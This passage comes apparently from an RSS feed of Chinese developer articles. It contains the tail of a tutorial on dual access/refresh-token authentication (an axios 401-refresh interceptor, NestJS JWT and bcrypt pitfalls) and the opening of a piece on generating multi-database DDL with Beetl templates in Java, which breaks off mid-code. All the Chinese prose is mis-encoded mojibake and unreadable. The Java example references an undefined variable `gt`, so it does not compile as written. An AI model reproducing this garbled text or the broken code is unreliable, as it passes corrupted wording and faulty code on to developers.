    if (response?.<span class="hljs-attr">status</span> === <span class="hljs-number">401</span> &amp;&amp; !config._retry) {
      <span class="hljs-attr">config._retry</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>

      if (isRefreshing) {
        // è‹¥æ­£åœ¨åˆ·æ–°ï¼Œå°†è¯·æ±‚åŠ å…¥é˜Ÿåˆ—ï¼Œç­‰å¾…æ–°Token
        return new Promise((resolve) =&gt; {
          requestsQueue.push((token) =&gt; {
            <span class="hljs-attr">config.headers.Authorization</span> = `Bearer <span class="hljs-variable">${token}</span>`<span class="hljs-comment">;</span>
            resolve(instance(config))<span class="hljs-comment">;</span>
          })<span class="hljs-comment">;</span>
        })<span class="hljs-comment">;</span>
      }

      <span class="hljs-attr">isRefreshing</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
      try {
        const { refreshToken } = useUserStore.getState()<span class="hljs-comment">;</span>
        if (!refreshToken) throw new Error('No refresh token')<span class="hljs-comment">;</span>

        const { access_token, refresh_token } = await instance.post('/auth/refresh', {
          refresh_token: refreshToken
        })<span class="hljs-comment">;</span>

        // æ›´æ–°æœ¬åœ°Token
        useUserStore.setState({ accessToken: access_token, refreshToken: refresh_token })<span class="hljs-comment">;</span>

        // é‡å‘é˜Ÿåˆ—ä¸­æ‰€æœ‰è¯·æ±‚
        requestsQueue.forEach(<span class="hljs-attr">cb</span> =&gt; cb(access_token))<span class="hljs-comment">;</span>
        <span class="hljs-attr">requestsQueue</span> = []<span class="hljs-comment">;</span>

        // é‡å‘å½“å‰è¯·æ±‚
        <span class="hljs-attr">config.headers.Authorization</span> = `Bearer <span class="hljs-variable">${access_token}</span>`<span class="hljs-comment">;</span>
        return instance(config)<span class="hljs-comment">;</span>
      } catch (e) {
        // åˆ·æ–°å¤±è´¥ï¼šè·³è½¬ç™»å½•é¡µ
        useUserStore.getState().logout()<span class="hljs-comment">;</span>
        <span class="hljs-attr">window.location.href</span> = <span class="hljs-string">'/login'</span><span class="hljs-comment">;</span>
        return Promise.reject(e)<span class="hljs-comment">;</span>
      } finally {
        <span class="hljs-attr">isRefreshing</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
      }
    }
    return Promise.reject(err)<span class="hljs-comment">;</span>
  }
)<span class="hljs-comment">;</span>
</code></pre>
<p>è¿™æ®µä»£ç å®ç°äº† Token è¿‡æœŸæ—¶çš„è‡ªåŠ¨åˆ·æ–°ä¸è¯·æ±‚é‡è¯•æœºåˆ¶ã€‚å½“æ¥å£è¿”å› 401 ä¸”è¯·æ±‚æœªè¢«é‡è¯•è¿‡ï¼ˆ<code>!config._retry</code>ï¼‰æ—¶ï¼Œæ‹¦æˆªå™¨ä¼šå°è¯•ç”¨ <code>refresh_token</code> åˆ·æ–°è·å–æ–° Tokenã€‚è‹¥æ­¤æ—¶å·²æœ‰åˆ·æ–°æ“ä½œæ­£åœ¨è¿›è¡Œï¼ˆ<code>isRefreshing = true</code>ï¼‰ï¼Œåˆ™å°†å½“å‰è¯·æ±‚åŠ å…¥é˜Ÿåˆ— <code>requestsQueue</code>ï¼Œç­‰å¾…æ–° Token è¿”å›åå†æ‰§è¡Œã€‚è‹¥æ— åˆ·æ–°ä»»åŠ¡ï¼Œåˆ™å‘èµ· <code>/auth/refresh</code> è¯·æ±‚ï¼ŒæˆåŠŸåæ›´æ–°æœ¬åœ° Tokenï¼Œå¹¶éå†é˜Ÿåˆ—æ‰¹é‡é‡å‘æ‰€æœ‰æŒ‚èµ·çš„è¯·æ±‚ï¼Œæœ€åé‡è¯•å½“å‰å¤±è´¥è¯·æ±‚ã€‚è‹¥åˆ·æ–°å¤±è´¥ï¼ˆå¦‚ <code>refresh_token</code> è¿‡æœŸï¼‰ï¼Œåˆ™æ¸…ç©ºç™»å½•çŠ¶æ€å¹¶è·³è½¬è‡³ç™»å½•é¡µã€‚é€šè¿‡ <code>isRefreshing</code> é”å’Œè¯·æ±‚é˜Ÿåˆ—ï¼Œæœ‰æ•ˆé¿å…äº†é‡å¤åˆ·æ–°å’Œè¯·æ±‚ä¸¢å¤±ï¼Œç¡®ä¿ç”¨æˆ·ä½“éªŒæ— ç¼ã€‚</p>
<h4 data-id="heading-16">å…³é”®æœºåˆ¶è§£æï¼š</h4>





















<table><thead><tr><th>æœºåˆ¶</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td><code>config._retry</code></td><td>é˜²æ­¢ 401 é”™è¯¯æ— é™å¾ªç¯è§¦å‘åˆ·æ–°</td></tr><tr><td><code>isRefreshing</code></td><td>å…¨å±€é”ï¼Œé¿å…å¤šä¸ª 401 è¯·æ±‚åŒæ—¶å‘èµ·åˆ·æ–°</td></tr><tr><td><code>requestsQueue</code></td><td>ç¼“å­˜åˆ·æ–°æœŸé—´çš„æ‰€æœ‰è¯·æ±‚ï¼Œå¾…æ–° Token åˆ°æ‰‹åç»Ÿä¸€é‡å‘</td></tr></tbody></table>
<blockquote>
<p>ğŸ’¡ <strong>ç”¨æˆ·ä½“éªŒä¼˜åŒ–</strong>ï¼šæ•´ä¸ªè¿‡ç¨‹ç”¨æˆ·æ— æ„ŸçŸ¥ï¼Œé¡µé¢ä¸ä¼šè·³è½¬ï¼Œæ“ä½œä¸ä¸­æ–­ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-17">å››ã€é¿å‘æŒ‡å—ï¼šé‚£äº›å¹´è¸©è¿‡çš„â€œé›·â€</h2>
<h3 data-id="heading-18">åç«¯ç¯‡</h3>
<ol>
<li>
<p><strong>JwtStrategy æœªæ³¨å†Œåˆ°æ¨¡å— providers</strong></p>
<ul>
<li><strong>ç°è±¡</strong>ï¼šè°ƒç”¨å—ä¿æŠ¤æ¥å£æ—¶æŠ¥é”™Â <code>Unknown authentication strategy "jwt"</code>ã€‚</li>
<li><strong>åŸå› </strong>ï¼š<code>JwtStrategy</code>Â æ˜¯ Guard çš„åº•å±‚ç­–ç•¥ï¼Œå¿…é¡»åœ¨Â <code>AuthModule</code>Â çš„Â <code>providers</code>Â ä¸­æ˜¾å¼æ³¨å†Œã€‚</li>
<li><strong>è§£å†³</strong>ï¼šåœ¨Â <code>AuthModule</code>Â çš„Â <code>providers</code>Â æ•°ç»„ä¸­åŠ å…¥Â <code>JwtStrategy</code>ã€‚</li>
</ul>
</li>
<li>
<p><strong>å¯†ç éªŒè¯å¤±è´¥</strong></p>
<ul>
<li>åŸå› ï¼šæ³¨å†Œæ—¶ç”¨ <code>bcrypt.hash(password, 10)</code>ï¼Œç™»å½•æ—¶å´æœªç”¨ <code>bcrypt.compare</code>ã€‚</li>
<li>æ­£ç¡®åšæ³•ï¼š<strong>æ°¸è¿œä¸è¦æ¯”å¯¹æ˜æ–‡å¯†ç </strong>ï¼Œå¿…é¡»ç”¨ <code>compare</code> éªŒè¯å“ˆå¸Œå€¼ã€‚</li>
</ul>
</li>
<li>
<p><strong>JWT å¯†é’¥ä¸ä¸€è‡´æˆ–æœªåŠ è½½</strong></p>
<ul>
<li><strong>ç°è±¡</strong>ï¼šToken ç­¾å‘æˆåŠŸï¼Œä½†éªŒè¯æ—¶æŠ¥Â <code>invalid signature</code>ã€‚</li>
<li><strong>åŸå› </strong>ï¼š<code>JwtModule.register()</code>Â ä¸Â <code>jwtService.verifyAsync()</code>Â ä½¿ç”¨çš„å¯†é’¥ä¸åŒï¼Œæˆ–Â <code>.env</code>Â æœªæ­£ç¡®åŠ è½½ã€‚</li>
<li><strong>è§£å†³</strong>ï¼šç¡®ä¿ç»Ÿä¸€ä½¿ç”¨Â <code>process.env.TOKEN_SECRET</code>ï¼Œå¹¶åœ¨Â <code>main.ts</code>Â ä¸­è°ƒç”¨Â <code>config()</code>Â åŠ è½½ç¯å¢ƒå˜é‡ï¼ˆå¦‚ä½¿ç”¨Â <code>@nestjs/config</code>ï¼‰ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-19">å‰ç«¯ç¯‡</h3>
<ol>
<li>
<p><strong>Token æŒä¹…åŒ–å¤±æ•ˆ</strong></p>
<ul>
<li>æ£€æŸ¥ <code>partialize</code> æ˜¯å¦åŒ…å« <code>accessToken</code> å’Œ <code>refreshToken</code>ã€‚</li>
</ul>
</li>
<li>
<p><strong>åˆ·æ–°æ­»å¾ªç¯</strong></p>
<ul>
<li>ç¡®ä¿ <code>config._retry = true</code> ç”Ÿæ•ˆï¼Œä¸”åˆ·æ–°å¤±è´¥å<strong>æ¸…ç©ºé˜Ÿåˆ—</strong>å¹¶è·³è½¬ç™»å½•ã€‚</li>
</ul>
</li>
<li>
<p><strong>è¯·æ±‚å¤´æ ¼å¼é”™è¯¯</strong></p>
<ul>
<li>å¿…é¡»ä¸º <code>Authorization: Bearer &lt;token&gt;</code>ï¼Œ<strong><code>Bearer</code> åæœ‰ç©ºæ ¼</strong>ï¼Œå¦åˆ™åç«¯æ— æ³•è§£æã€‚</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-20">äº”ã€æ€»ç»“ï¼šåŒToken çš„ä»·å€¼ä¸æ‰©å±•</h2>
<p>åŒ Token æœºåˆ¶ä¹‹æ‰€ä»¥æˆä¸ºè¡Œä¸šæ ‡å‡†ï¼Œæ˜¯å› ä¸ºå®ƒ<strong>ç²¾å‡†å¹³è¡¡äº†å®‰å…¨ä¸ä½“éªŒ</strong>ï¼š</p>
<ol>
<li><strong>å®‰å…¨æ€§é«˜</strong>ï¼šçŸ­æ—¶æ•ˆ access_token é™åˆ¶æ³„éœ²åçš„æ”»å‡»çª—å£ï¼Œrefresh_token ä¸å‚ä¸ä¸šåŠ¡è¯·æ±‚ï¼Œé™ä½é£é™©ã€‚</li>
<li><strong>ä½“éªŒæµç•…</strong>ï¼šaccess_token è¿‡æœŸåå¯è‡ªåŠ¨æ— æ„Ÿåˆ·æ–°ï¼Œç”¨æˆ·æ— éœ€é¢‘ç¹é‡æ–°ç™»å½•ï¼Œæ“ä½œä¸ä¸­æ–­ã€‚</li>
<li><strong>çµæ´»å¯æ§</strong>ï¼šæ”¯æŒ Token è½®æ¢ã€å¼ºåˆ¶ä¸‹çº¿ã€æœ‰æ•ˆæœŸç‹¬ç«‹é…ç½®ï¼Œä¾¿äºå®ç°ç²¾ç»†åŒ–å®‰å…¨ç­–ç•¥ã€‚</li>
</ol>
<hr/>
<blockquote>
<p>ğŸŒŸ <strong>ç»“è¯­</strong>ï¼šè®¤è¯æ¨¡å—çœ‹ä¼¼ç®€å•ï¼Œå®åˆ™æš—è—ç„æœºã€‚ä¸€ä¸ªå¥å£®çš„åŒ Token ä½“ç³»ï¼Œä¸ä»…èƒ½æŠµå¾¡å¸¸è§æ”»å‡»ï¼Œæ›´èƒ½ä¸ºç”¨æˆ·æä¾›â€œæ— æ„Ÿå´å®‰å…¨â€çš„ä½“éªŒã€‚æœ¬æ–‡æ‰€åˆ†äº«çš„ä»£ç ä¸é€»è¾‘ï¼Œå·²åœ¨å¤šä¸ªçº¿ä¸Šé¡¹ç›®ç¨³å®šè¿è¡Œï¼Œæ¬¢è¿ç›´æ¥å€Ÿé‰´ã€ä¼˜åŒ–ã€è½åœ°ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[beetl + java å¤šç§æ•°æ®åº“ddlç®¡ç†å®è·µ]]></title>    <link>https://juejin.cn/post/7601007650722693161</link>    <guid>https://juejin.cn/post/7601007650722693161</guid>    <pubDate>2026-01-30T13:54:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601007650722693161" data-draft-id="7600994087587594259" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="beetl + java å¤šç§æ•°æ®åº“ddlç®¡ç†å®è·µ"/> <meta itemprop="keywords" content="åç«¯,Java"/> <meta itemprop="datePublished" content="2026-01-30T13:54:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è™šæ‹Ÿä¸–ç•Œ"/> <meta itemprop="url" content="https://juejin.cn/user/1118643258130796"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            beetl + java å¤šç§æ•°æ®åº“ddlç®¡ç†å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1118643258130796/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è™šæ‹Ÿä¸–ç•Œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:54:36.000Z" title="Fri Jan 30 2026 13:54:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å›½äº§æ•°æ®åº“é€‚é…æ˜¯è¿‘å¹´æ¥æˆ‘å›½åœ¨ä¿¡æ¯æŠ€æœ¯é¢†åŸŸæ¨åŠ¨è‡ªä¸»å¯æ§ã€å®‰å…¨å¯ä¿¡æˆ˜ç•¥çš„é‡è¦å®è·µï¼Œå…¶æ ¸å¿ƒé©±åŠ¨åŠ›æºäºå›½å®¶å®‰å…¨ã€æŠ€æœ¯ç«äº‰ã€äº§ä¸šå‡çº§åŠæ•°æ®ä¸»æƒç­‰å¤šé‡éœ€æ±‚çš„äº¤ç»‡ã€‚</p>
</blockquote>
<h2 data-id="heading-0">å…³é”®èƒŒæ™¯</h2>
<h3 data-id="heading-1">å›½å®¶æˆ˜ç•¥ä¸å®‰å…¨</h3>
<p>â€œå¡è„–å­â€é£é™©å€’é—­æŠ€æœ¯è‡ªä¸»</p>
<p>â€œè‡ªä¸»å¯æ§â€æˆä¸ºå›½å®¶æˆ˜ç•¥</p>
<h3 data-id="heading-2">æ•°æ®è¦ç´ åŒ–ä¸åˆè§„è¦æ±‚</h3>
<p>æ•°æ®ä½œä¸ºæ ¸å¿ƒç”Ÿäº§è¦ç´ çš„åœ°ä½æå‡</p>
<p>åˆè§„æ€§å‹åŠ›å¢å¤§</p>
<p>æŠ€æœ¯æˆç†Ÿåº¦æå‡</p>
<h3 data-id="heading-3">æŠ€æœ¯æˆç†Ÿåº¦æå‡</h3>
<p>å›½äº§æŠ€æœ¯ä»å¯ç”¨åˆ°å¥½ç”¨</p>
<p>ä¿¡åˆ›äº§ä¸šç”Ÿæ€çš„æ„å»º</p>
<p>é™ä½ä¾›åº”é“¾é£é™©</p>
<p>é•¿æœŸæˆæœ¬ä¼˜åŠ¿</p>
<h2 data-id="heading-4">ä»å•æ•°æ®åº“åˆ°å¤šæ•°æ®åº“çš„å‘å±•è·¯ç¨‹</h2>
<h3 data-id="heading-5">å•åº“çš„ç»´æŠ¤æ–¹å¼</h3>
<p>ä»¥æ–‡ä»¶çš„æ–¹å¼ï¼Œé…åˆä»£ç ä»“åº“è¿›è¡Œç»Ÿä¸€ç®¡ç†ã€‚è„šæœ¬åŒ…æ‹¬ï¼šåˆ›å»ºè¡¨ã€åˆ›å»ºè§†å›¾ã€åˆå§‹åŒ–æ•°æ®ã€å­˜å‚¨è¿‡ç¨‹ï¼ˆå·²åºŸå¼ƒï¼‰ã€æ–°å¢åˆ—ç­‰ã€‚</p>
<p>ç¤ºä¾‹ç›®å½•ç»“æœå…¥ä¸‹ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">  DDL
    â”œâ”€v1.0
        â”œâ”€table_{table_name}_create.sql
        â”œâ”€table_{table_name}_init_data.sql
        â”œâ”€sequence_{sequence_name}.sql
        â””â”€view_{view_name}_create.sql
    â”œâ”€v1.1
        â”œâ”€table_{table_name}_create.sql
        â”œâ”€table_{table_name}_add_column.sql
        â”œâ”€sequence_{sequence_name}.sql
        â””â”€view_{view_name}_change.sql
    â”œâ”€v1.2
        â”œâ”€table_{table_name}_create.sql
        â”œâ”€table_{table_name}_add_column.sql
        â”œâ”€sequence_{sequence_name}.sql
        â””â”€view_{view_name}_create.sql
</code></pre>
<h3 data-id="heading-6">å¤šæ•°æ®åº“é€‚é…ååˆæ­¥æ–¹æ¡ˆ</h3>
<pre><code class="hljs language-shell" lang="shell">â”œâ”€DDL
    â”œâ”€tidb
        â”œâ”€v1.0  
        â””â”€v1.1
    â”œâ”€dm
        â”œâ”€v1.0  
        â””â”€v1.1
    â”œâ”€gaussdb
        â”œâ”€v1.0  
        â””â”€v1.1
    â”œâ”€kingbase
        â”œâ”€v1.0  
        â””â”€v1.1
</code></pre>
<h3 data-id="heading-7">éšä¹‹è€Œæ¥çš„é—®é¢˜</h3>
<p>å¤§é‡çš„é‡å¤çš„å·¥ä½œï¼šå»ºä¸€å¼ è¡¨éœ€è¦å†™å¤šä¸ªæ•°æ®åº“çš„è„šæœ¬ï¼Œå¢åŠ åˆ—å­—æ®µéœ€è¦ä¿®æ”¹å¤šä¸ªæ•°æ®åº“ä¸‹çš„è„šæœ¬ã€‚æ”¹åŠ¨éœ€æ‰‹åŠ¨åœ¨æ•°æ®åº“ä¸­éªŒè¯ã€‚é‡å¤ä¸”åˆ†æ•£çš„æ“ä½œææ˜“å‡ºé”™ï¼šç»™gaussDBä¿®æ”¹äº†ï¼Œå¿˜è®°åŒæ­¥å¤„ç†é‡‘ä»“æ•°æ®åº“ã€‚è¿›è€Œä¸ºçº¿ä¸Šå¢åŠ éšæ‚£ã€‚
å¤šæ•°æ®åº“é€‚é…è¿›ä¸€æ­¥çš„è§£å†³æ–¹æ¡ˆ</p>
<h2 data-id="heading-8">ç›®æ ‡</h2>
<p>è§£è€¦æ•°æ®è¡¨çš„å®šä¹‰ä¸å…·ä½“DDLå®ç°ï¼Œå¹¶å®ç°å·¥ç¨‹åŒ–ã€‚</p>
<h2 data-id="heading-9">å®ç°è·¯å¾„</h2>
<p>1.åˆ›å»ºä¸åŒæ•°æ®åº“çš„ beetl æ¨¡æ¿ã€‚
2.javaç¨‹åºè‡ªåŠ¨åŒ–ï¼ˆå¯é›†æˆè‡³spring booté¡¹ç›®ï¼‰
3.æœªæ¥çš„æ‰©å±•ä»…éœ€æ·»åŠ å¯¹åº”æ•°æ®åº“çš„ beetl æ¨¡æ¿å³å¯ã€‚</p>
<h2 data-id="heading-10">é¡¹ç›®ç»“æ„</h2>
<h3 data-id="heading-11">javaä¾èµ–åŒ…</h3>
<pre><code class="hljs language-shell" lang="shell">â”œâ”€libs
â”‚      antlr4-runtime-4.9.3.jar
â”‚      beetl-3.20.1.RELEASE.jar
â”‚      beetl-core-3.20.1.RELEASE.jar
â”‚      beetl-default-antlr4.9-support-3.20.1.RELEASE.jar
â”‚      beetl-ext-3.20.1.RELEASE.jar
</code></pre>
<h3 data-id="heading-12">javaå®ä½“ç±»</h3>
<pre><code class="hljs language-shell" lang="shell">â”œâ”€domain
â”‚      ColumnBuilder.java 
â”‚      ColumnDefinition.java
â”‚      TableBuilder.java
â”‚      TypeEnum.java
â”‚      DefaultEnum.java
â”‚      TableDefinition.java
â”‚      Main.java
</code></pre>
<p>*Builder.java ç±»ä¸ºæ„å»ºå¯¹è±¡çš„buildæ¨¡å¼ã€‚æŒ‰ç…§ä¸ªäººä¹ æƒ¯æ„å»ºï¼Œä»£ç è¾ƒé•¿ï¼Œå°±ä¸å±•ç¤ºå•¦ã€‚</p>
<p>å…¶ä»–ä»£ç å¦‚ä¸‹ï¼š</p>
<p>TableDefinition.java</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TableDefinition</span> {
    <span class="hljs-keyword">private</span> String database;
    <span class="hljs-keyword">private</span> String tableName;
    <span class="hljs-keyword">private</span> String comment;
    <span class="hljs-keyword">private</span> String tablespace;
    <span class="hljs-keyword">private</span> List&lt;ColumnDefinition&gt; columns;
}
</code></pre>
<p>ColumnDefinition.java</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ColumnDefinition</span> {
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> TypeEnum type;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> length;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> precision;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> scale;
    <span class="hljs-keyword">private</span> String comment;
    <span class="hljs-keyword">private</span> <span class="hljs-type">DefaultEnum</span> <span class="hljs-variable">defaultValueEnum</span> <span class="hljs-operator">=</span> DefaultEnum.NONE;
    <span class="hljs-keyword">private</span> String defaultValue;
}
</code></pre>
<p>TypeEnum.java</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">TypeEnum</span> {
    STRING,
    NUMBER,
    CLOB,
    DATE
}
</code></pre>
<p>DefaultEnum.java</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">DefaultEnum</span> {
    CURRENT_DATE,  <span class="hljs-comment">// å½“å‰æ—¶é—´ </span>
    SYS_ID,        <span class="hljs-comment">// æ•°æ®åº“ID </span>
    NONE,          <span class="hljs-comment">// æ— é»˜è®¤å€¼</span>
    FIX_VALUE      <span class="hljs-comment">// æŒ‡å®šé»˜è®¤å€¼</span>
}
</code></pre>
<p>Main.java</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>{
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Main</span>().check();
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">check</span><span class="hljs-params">()</span> {

        <span class="hljs-type">TableDefinition</span> <span class="hljs-variable">poc_project_baseinfo</span> <span class="hljs-operator">=</span> TableDefinition.builder()
                .name(<span class="hljs-string">"test_table"</span>)
                .database(<span class="hljs-string">"test_user"</span>)
                .comment(<span class="hljs-string">"æµ‹è¯•è¡¨"</span>)
                .column(ColumnDefinition.builder()
                .string()
                .name(<span class="hljs-string">"id"</span>)
                .length(<span class="hljs-number">50</span>)
                .comment(<span class="hljs-string">"ID"</span>)
                .build())
                .column(ColumnDefinition.builder()
                .string()
                .name(<span class="hljs-string">"project_name"</span>)
                .comment(<span class="hljs-string">"åç§°"</span>).build())
                .build();

        List&lt;TableDefinition&gt; tables = Arrays.asList(poc_project_baseinfo);
        
        <span class="hljs-comment">// ç¯‡å¹…é™åˆ¶ï¼Œè‡ªåŠ¨åŒ–éƒ¨åˆ†ä¸‹æ¬¡åˆ†äº«</span>
       
        <span class="hljs-type">GroupTemplate</span> <span class="hljs-variable">gt1</span> <span class="hljs-operator">=</span> getGroupTemplate(<span class="hljs-string">"gaussdb"</span>);

        <span class="hljs-type">Template</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> gt1.getTemplate(<span class="hljs-string">"beetl/base/create_table.btl"</span>);
        t1.binding(<span class="hljs-string">"tables"</span>, tables);
        <span class="hljs-type">String</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> t1.render();

        <span class="hljs-comment">// ä»…æ‰“å° create table ddl</span>
        System.out.println(r1);

        <span class="hljs-type">GroupTemplate</span> <span class="hljs-variable">gt2</span> <span class="hljs-operator">=</span> getGroupTemplate(<span class="hljs-string">"dm"</span>);

        <span class="hljs-type">Template</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> gt.getTemplate(<span class="hljs-string">"beetl/base/create_table.btl"</span>);
        t2.binding(<span class="hljs-string">"tables"</span>, tables);
        <span class="hljs-type">String</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> t2.render();
